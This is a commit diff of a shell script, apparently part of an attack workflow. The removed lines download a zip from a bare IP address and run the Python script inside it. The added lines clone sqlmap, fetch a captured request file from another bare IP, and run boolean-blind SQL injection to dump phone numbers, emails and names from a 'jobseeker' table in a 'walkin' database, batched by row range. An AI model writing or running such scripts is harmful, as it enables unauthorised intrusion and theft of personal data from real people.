67b4185688a93840ca8e720eb5cb7c8136255365
xiutai <101174238+xiutai@users.noreply.github.com>
2022-12-13 20:09:44 +0800

    Update go.sh

--- go.sh
+++ go.sh
@@ -1,7 +1,13 @@
+dir="/root/sqlmap/1.txt"
 apt update
-apt install python3-pip zip -y
-pip install requests
-cd /root/spa
-wget http://20.187.190.201:8080/wp-content/uploads/2022/12/spa-12.5.zip
-unzip spa-12.5.zip
-python3 spa-12.5.py
+if [ -f "$dir" ] ; then
+  echo "ok"
+else
+  git clone https://github.com/sqlmapproject/sqlmap.git
+  wget -O /root/sqlmap/1.txt http://20.24.186.53:7788/1.txt
+fi
+echo "input start value:"
+read start
+echo "input stop value:"
+read stop
+python3 /root/sqlmap/sqlmap.py -r 1.txt --drop-set-cookie --technique B --batch -D walkin -T jobseeker -C "phone,email,name" --dump --skip-urlencode --thread 10  --start $start --stop $stop
